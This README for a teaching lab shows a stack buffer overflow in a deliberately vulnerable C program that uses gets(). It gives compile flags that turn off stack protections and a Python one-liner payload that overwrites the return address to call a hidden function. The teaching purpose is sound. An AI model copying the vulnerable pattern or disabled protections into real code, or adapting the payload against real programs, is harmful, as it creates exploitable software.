# Buffer Overflow Vulnerability Demonstration

This directory contains C programs that demonstrate buffer overflow vulnerabilities for educational purposes.

## Files

- `buffer_overflow_demo.c` - Buffer overflow with return address overwrite (calls secret function)
- `buffer_overflow_advanced.c` - Advanced example showing potential exploitation
- `auto_exploit.py` - Automated exploit script
- `exploit_helper.py` - Helper script to craft exploit payloads
- `test_exploit.sh` - Test script for different offsets
- `demo_overflow.sh` - Script to demonstrate basic overflow
- `buffer_overflow_demo_instructions.txt` - Detailed instructions

## What is a Buffer Overflow?

A buffer overflow occurs when a program writes more data to a buffer than it can hold. This causes the excess data to overflow into adjacent memory locations, potentially corrupting other variables or causing the program to crash.

## Compilation

### macOS:

```bash
gcc -o buffer_overflow_demo buffer_overflow_demo.c -fno-stack-protector -Wno-deprecated-declarations
```

### Linux:

```bash
gcc -o buffer_overflow_demo buffer_overflow_demo.c -fno-stack-protector -z execstack
```

**Note:** The `-fno-stack-protector` flag disables stack canaries (security protection) to make the vulnerability easier to demonstrate. In production code, these protections are enabled by default.

## How to Trigger the Buffer Overflow

### Method 1: Normal Input (Safe)

```bash
echo "Hello" | ./buffer_overflow_demo
```

**Result:** Buffer contains "Hello", program completes normally.

### Method 2: Call Secret Function via Return Address Overwrite

The program now includes a `secret_function()` that should never be called. You can exploit the buffer overflow to overwrite the return address and redirect execution to this secret function.

**Step 1:** Run the program to get the secret function address:

```bash
./buffer_overflow_demo
# Note the "Secret function address" shown
```

**Step 2:** Use the automated exploit script:

```bash
python3 auto_exploit.py
```

**Step 3:** Or manually craft the exploit (replace `0xADDRESS` with the address shown):

```bash
python3 -c "import struct,sys; sys.stdout.buffer.write(b'A'*32 + struct.pack('<Q', 0xADDRESS))" | ./buffer_overflow_demo
```

**Result:** If successful, you'll see "**_ SECRET FUNCTION ACTIVATED! _**" message.

**Note:** The exact offset (32 bytes in the example) may need adjustment depending on your system's stack layout. Try offsets: 24, 32, 40, 48.

### Method 3: Basic Memory Corruption

```bash
python3 -c "print('A' * 25)" | ./buffer_overflow_demo
```

**Result:** Buffer overflows and may corrupt adjacent memory or crash the program.

## What Happens?

### Basic Buffer Overflow:

1. The `buffer` array can only hold 16 bytes (15 characters + null terminator)
2. The `gets()` function doesn't check buffer bounds
3. When you input more than 15 characters, the excess data overflows
4. The overflow corrupts adjacent memory on the stack

### Return Address Overwrite Attack:

1. By overflowing the buffer with carefully crafted data, we can overwrite the return address stored on the stack
2. When the function returns, instead of going back to the caller, execution jumps to our chosen address
3. We redirect execution to `secret_function()` which should never be called
4. This demonstrates how buffer overflows can be used for code execution attacks

## Key Vulnerable Code

```c
char buffer[16];  // Only 16 bytes
gets(buffer);     // No bounds checking - DANGEROUS!
```

## Safe Alternatives

Instead of `gets()`, always use:

```c
// Safe: fgets() with size limit
fgets(buffer, sizeof(buffer), stdin);

// Or: scanf() with field width
scanf("%15s", buffer);  // Limits to 15 characters
```

## Security Notes

- **Never use `gets()` in production code** - it's been removed from C11 standard
- Always validate input length before copying
- Use functions that accept buffer size parameters
- Modern compilers add protections (stack canaries, ASLR) that make exploitation harder
- This demonstration is for **educational purposes only**

## Expected Output

**Normal input:**

```
Buffer contents: Hello
Function should return normally...
Normal execution completed.
```

**Successful exploit (calling secret function):**

```
╔════════════════════════════════════════╗
║  *** SECRET FUNCTION ACTIVATED! ***   ║
║                                        ║
║  You have successfully exploited a    ║
║  buffer overflow to call a function  ║
║  that was never meant to be called!   ║
║                                        ║
║  This demonstrates return address     ║
║  overwrite attack via buffer overflow.║
╚════════════════════════════════════════╝
```

**Failed exploit (wrong offset):**

- Program may crash with segmentation fault
- Or complete normally without calling secret function
